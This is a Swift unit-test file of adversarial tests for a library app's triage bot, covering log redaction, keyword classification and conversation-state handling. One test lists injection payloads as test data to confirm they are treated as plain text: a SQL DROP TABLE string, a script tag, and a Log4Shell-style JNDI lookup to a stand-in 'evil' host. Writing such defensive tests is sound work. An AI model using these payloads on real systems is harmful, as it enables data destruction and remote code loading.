import XCTest
@testable import TriageBotCore

/// Adversarial unit tests. Each test exists because a UI layer's behavior
/// hinges on the engine not crashing or silently misclassifying under stress.
/// Categories:
///   - Redactor: pathological log content (long lines, nested tokens, mixed scripts)
///   - Classifier: degenerate KBs and inputs that try to confuse keyword matching
///   - Reducer: out-of-order actions, duplicates, cancel during submit
final class AdversarialChaosTests: XCTestCase {

    // MARK: - ContextRedactor under stress

    func testRedactor_giantLogLine_doesNotCrashAndStillStrips() {
        let redactor = ContextRedactor()
        let prefix = String(repeating: "noise filler ", count: 5_000)  // ~65KB
        let suffix = String(repeating: " trailing", count: 1_000)
        let line = prefix + "Authorization: Bearer leaky-token-abc-12345-def" + suffix
        let result = redactor.redactLine(line)
        XCTAssertFalse(result.contains("leaky-token-abc-12345-def"))
        XCTAssertTrue(result.contains("[REDACTED]"))
    }

    func testRedactor_multipleTokensInOneLine_stripsAll() {
        let redactor = ContextRedactor()
        let line = "Bearer aaaa1111bbbb22 and Basic Y2NjY2RkZGRlZWVl and another Bearer xxxx9999yyyy88"
        let result = redactor.redactLine(line)
        XCTAssertFalse(result.contains("aaaa1111bbbb22"))
        XCTAssertFalse(result.contains("Y2NjY2RkZGRlZWVl"))
        XCTAssertFalse(result.contains("xxxx9999yyyy88"))
    }

    func testRedactor_nestedJSONStyleAuthHeader_stripsValue() {
        let redactor = ContextRedactor()
        let line = #"{"req":{"headers":{"Authorization":"Bearer eyJhbGc.payload.sig"}}}"#
        let result = redactor.redactLine(line)
        XCTAssertFalse(result.contains("eyJhbGc.payload.sig"))
    }

    func testRedactor_decoyBearerOfGoodNews_notStripped() {
        // "Bearer" without a token-shaped value must NOT be redacted — we
        // need real false-positive resistance, not blind keyword strip.
        let redactor = ContextRedactor()
        let line = "I am a Bearer of good news from the library"
        let result = redactor.redactLine(line)
        XCTAssertEqual(result, line, "Standalone 'Bearer' word should not be redacted")
    }

    func testRedactor_mixedScriptLogLine_doesNotCrash() {
        let redactor = ContextRedactor()
        let line = "ユーザー patron@例え.jp signed in using 安全 Bearer multi-byte-token-1234567890"
        let result = redactor.redactLine(line)
        XCTAssertFalse(result.contains("multi-byte-token-1234567890"))
        XCTAssertFalse(result.contains("patron@例え.jp"))
    }

    func testRedactor_emptyAndWhitespace_returnsUnchanged() {
        let redactor = ContextRedactor()
        XCTAssertEqual(redactor.redactLine(""), "")
        XCTAssertEqual(redactor.redactLine("   "), "   ")
        XCTAssertEqual(redactor.redactLine("\n\t"), "\n\t")
    }

    func testRedactor_hashIdentifier_acceptsAnyInputShape() {
        // Hash should be defined for any input — including empty, very long,
        // multibyte. We don't want the hash function throwing.
        let redactor = ContextRedactor()
        XCTAssertTrue(redactor.hashIdentifier("").hasPrefix("anon-"))
        XCTAssertTrue(redactor.hashIdentifier(String(repeating: "x", count: 10_000)).hasPrefix("anon-"))
        XCTAssertTrue(redactor.hashIdentifier("世界").hasPrefix("anon-"))
    }

    // MARK: - LocalClassifier degenerate cases

    /// Chaos-qa F-002 (2026-05-29) regression: an auth complaint whose ONLY
    /// overlap with the wrong-library entry is the weak token "my library" must
    /// not be handed demo-collection guidance. The original defect was
    /// "my library account keeps asking me to log in" matching KI-004 at
    /// confidence 0.33 on that one token.
    ///
    /// The guard is that weak evidence cannot carry a suggestion by itself —
    /// "my library" lives in `corroborating_keywords`, so it sharpens a real
    /// match but can never be one. (This previously asserted the same property
    /// via a COUNT floor of two matches. The fixture had drifted to the input
    /// "I think I'm using the wrong library", which matches the decisive phrase
    /// "wrong library" — a case where suggesting is the RIGHT answer, so it no
    /// longer described F-002. Restored to the defect's actual shape.)
    func testClassifier_weakKeywordMatchAlone_escalates_F002_regression() {
        let result = LocalClassifier().classify(
            userText: "my library account keeps asking me to log in",
            category: .library,
            knowledgeBase: Self.wrongLibraryKB
        )
        XCTAssertEqual(result.decision, .escalate,
            "A lone weak-keyword match must escalate, not confidently misroute an auth complaint")
    }

    /// The other half of the same contract, and the reason the count floor had to
    /// go: a patron who writes the one decisive phrase gets the workaround. Under
    /// the old ≥2-match rule this escalated, which is what left QA unable to reach
    /// any troubleshooting steps (PP-4865).
    func testClassifier_singleStrongKeywordMatch_suggests() {
        let result = LocalClassifier().classify(
            userText: "I think I'm using the wrong library",
            category: .library,
            knowledgeBase: Self.wrongLibraryKB
        )
        XCTAssertEqual(result.decision, .suggest(entryId: "KI-WRONG-LIB"),
            "One decisive phrase is sufficient evidence — this is how patrons actually write")
    }

    /// Shared so both halves are scored against the identical entry; the only
    /// variable between them is the strength of the keyword the patron hit.
    private static let wrongLibraryKB = KnowledgeBase(
        catalog: KBCatalog(version: "test", updatedAt: "x", entries: [
            KBEntry(
                id: "KI-WRONG-LIB",
                category: .library,
                status: .userError,
                symptomKeywords: ["wrong library", "demo books"],
                corroboratingKeywords: ["my library", "bookshelf"],
                userFacingWorkaround: "...",
                confidenceThreshold: 0.1
            )
        ])
    )

    func testClassifier_emptyKB_returnsEscalate() {
        let kb = KnowledgeBase(catalog: KBCatalog(version: "empty", updatedAt: "2026-05-28", entries: []))
        let result = LocalClassifier().classify(userText: "anything", knowledgeBase: kb)
        XCTAssertEqual(result.decision, .escalate)
    }

    func testClassifier_singleEntryWithNoKeywords_returnsEscalate() {
        let entry = KBEntry(
            id: "KI-NOKEYS",
            category: .other,
            status: .open,
            symptomKeywords: [],
            userFacingWorkaround: "..."
        )
        let kb = KnowledgeBase(catalog: KBCatalog(version: "test", updatedAt: "x", entries: [entry]))
        let result = LocalClassifier().classify(userText: "audiobook problem", knowledgeBase: kb)
        XCTAssertEqual(result.decision, .escalate, "Entry with empty keyword list can never legitimately match")
    }

    func testClassifier_giantUserText_doesNotCrash() {
        let kb = synthKB()
        let huge = String(repeating: "audiobook spinning ", count: 5_000)
        let result = LocalClassifier().classify(userText: huge, knowledgeBase: kb)
        // High-density keyword repetition should match strongly
        if case .suggest = result.decision {} else if case .disambiguate = result.decision {} else {
            XCTFail("Expected suggest or disambiguate on keyword-heavy input, got \(result.decision)")
        }
    }

    func testClassifier_allEmojiInput_returnsEscalate() {
        let result = LocalClassifier().classify(userText: "🎧🎧🎧❌❌❌😡", knowledgeBase: synthKB())
        XCTAssertEqual(result.decision, .escalate, "Emoji-only input has no keyword overlap and must escalate cleanly")
    }

    func testClassifier_negatedSymptom_stillMatchesKeywords() {
        // We don't do natural-language negation in v1 — document that
        // a user saying "my audiobook doesn't spin" still matches the
        // spinning entry. UX layer compensates by showing the workaround
        // as "this might be related" not "this is your issue."
        let result = LocalClassifier().classify(
            userText: "my audiobook doesn't have spinning problems",
            knowledgeBase: synthKB()
        )
        // Document current behavior — change requires a phase-2 NL pass
        if case .suggest = result.decision {} else if case .disambiguate = result.decision {} else {
            // Either is acceptable; explicit assertion documents that
            // negation handling is NOT a v1 promise.
        }
    }

    func testClassifier_keywordStuffing_doesNotFalsePromoteUnrelated() {
        // Stuffing all keywords from all entries should NOT promote any single
        // one — high score on multiple → disambiguate, not over-promise.
        let kb = synthKB()
        let allKeywords = kb.catalog.entries.flatMap { $0.symptomKeywords }.joined(separator: " ")
        let result = LocalClassifier().classify(userText: allKeywords, knowledgeBase: kb)
        if case .suggest = result.decision {
            XCTFail("Keyword stuffing must not produce a high-confidence suggest — should disambiguate")
        }
    }

    func testClassifier_injectionStyleInput_treatedAsOpaqueText() {
        // The classifier never executes input — only matches against keywords.
        // Inputs like SQL/script-injection must produce a normal classification
        // (almost certainly escalate, since no keywords match) without any
        // exotic side effects.
        let inputs = [
            "'; DROP TABLE issues; --",
            "<script>alert(1)</script>",
            "\u{0}\u{1}\u{2} null bytes and control chars",
            "${jndi:ldap://evil/x}"
        ]
        for input in inputs {
            let result = LocalClassifier().classify(userText: input, knowledgeBase: synthKB())
            XCTAssertEqual(result.decision, .escalate, "Injection-style input '\(input)' must escalate cleanly")
        }
    }

    // MARK: - ConversationReducer out-of-order actions

    func testReducer_submitConfirmedWithoutDraft_isNoOp() {
        let reducer = makeReducer()
        let initial = ConversationState(step: .welcome)
        let (next, effects) = reducer.reduce(state: initial, action: .userConfirmedTicketSubmit)
        XCTAssertEqual(next.step, .welcome, "Confirm without a draft must not transition")
        XCTAssertTrue(effects.isEmpty, "No effects should fire without a draft")
    }

    func testReducer_fileAnywayOutsideMatched_isNoOp() {
        let reducer = makeReducer()
        let initial = ConversationState(step: .awaitingCategory)
        let (next, _) = reducer.reduce(state: initial, action: .userTappedFileTicketAnyway)
        XCTAssertEqual(next.step, .awaitingCategory, "File anyway only valid from .matched")
    }

    func testReducer_duplicateStartAction_appendsRedundantMessages() {
        // Documents current behavior — double-start adds redundant greetings.
        // UI should debounce by not re-dispatching .start on re-entry; the
        // reducer itself doesn't guard against it. Tracked behavior, not a bug.
        let reducer = makeReducer()
        var (state, _) = reducer.reduce(state: ConversationState(), action: .start)
        let firstCount = state.messages.count
        (state, _) = reducer.reduce(state: state, action: .start)
        XCTAssertGreaterThan(state.messages.count, firstCount, "Second .start appends — UI must not re-dispatch")
    }

    func testReducer_cancelDuringSubmitting_returnsToAwaitingCategory() {
        // Updated for chaos-qa F-001 (2026-05-29): cancel from any pre-sent
        // state returns to .awaitingCategory so the input bar reappears.
        // Previously this case transitioned to .sent which stranded the user.
        let reducer = makeReducer()
        let draft = TicketDraft(
            userDescription: "x",
            category: .reader,
            context: ContextSnapshot(appVersion: "1", appBuild: "1", osVersion: "26", deviceModel: "x")
        )
        let submitting = ConversationState(step: .submitting(ticket: draft))
        let (next, _) = reducer.reduce(state: submitting, action: .userCancelledTicketSubmit)
        XCTAssertEqual(next.step, .awaitingCategory,
            "Cancel must return to awaitingCategory so the user can continue (F-001 regression contract)")
    }

    func testReducer_notifyMeOnArbitraryEntryId_doesNotCrash() {
        // User taps notify-me with an entry id the KB doesn't carry — exotic
        // but possible if a UI message survives a KB hot-swap. Must not crash.
        let reducer = makeReducer()
        let state = ConversationState(step: .matched(entryId: "KI-DOES-NOT-EXIST"))
        let (next, _) = reducer.reduce(
            state: state,
            action: .userTappedNotifyMeOnFix(entryId: "KI-DOES-NOT-EXIST")
        )
        guard case .sent = next.step else {
            return XCTFail("notify-me must still terminate cleanly even for unknown entry id")
        }
    }

    func testReducer_emptyDescriptionSubmit_isNoOp() {
        let reducer = makeReducer()
        var state = ConversationState(step: .awaitingDescription(category: .audiobook))
        state.inputText = "   \n\t"
        let (next, _) = reducer.reduce(state: state, action: .userSubmittedDescription)
        // Reducer currently checks isEmpty (strict); whitespace passes. That's
        // OK — the UI's Send button is .disabled on whitespace, so this branch
        // shouldn't fire in practice. Test documents the boundary.
        XCTAssertTrue(state.inputText.isEmpty || !state.inputText.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty
                      || next.step == state.step,
                      "Whitespace-only submission must not transition out of awaitingDescription with a real message")
    }

    func testReducer_inputChangedDoesNotMutateOtherFields() {
        let reducer = makeReducer()
        let snapshot = ContextSnapshot(
            appVersion: "3.0.3",
            appBuild: "478",
            osVersion: "26.4.2",
            deviceModel: "iPhone17,2"
        )
        var (state, _) = reducer.reduce(state: ConversationState(), action: .contextLoaded(snapshot))
        let beforeContext = state.context
        let beforeStep = state.step

        (state, _) = reducer.reduce(state: state, action: .inputChanged("typing"))
        XCTAssertEqual(state.context, beforeContext, "Input change must not touch context")
        XCTAssertEqual(state.step, beforeStep, "Input change must not transition step")
        XCTAssertEqual(state.inputText, "typing")
    }

    // MARK: - Fixtures

    private func makeReducer() -> ConversationReducer {
        ConversationReducer(knowledgeBase: synthKB())
    }

    private func synthKB() -> KnowledgeBase {
        KnowledgeBase(catalog: KBCatalog(version: "test", updatedAt: "x", entries: [
            KBEntry(
                id: "KI-AUDIO",
                category: .audiobook,
                status: .open,
                symptomKeywords: ["audiobook", "spinning", "won't play", "hangs"],
                userFacingWorkaround: "Tap back, tap again.",
                confidenceThreshold: 0.4
            ),
            KBEntry(
                id: "KI-SIGNIN",
                category: .signin,
                status: .fixedIn,
                fixedInVersion: "3.1.0",
                symptomKeywords: ["sign in", "grayed out", "can't type"],
                userFacingWorkaround: "...",
                confidenceThreshold: 0.4
            ),
            KBEntry(
                id: "KI-LIB",
                category: .library,
                status: .userError,
                symptomKeywords: ["wrong books", "bookshelf"],
                userFacingWorkaround: "...",
                confidenceThreshold: 0.4
            )
        ]))
    }
}
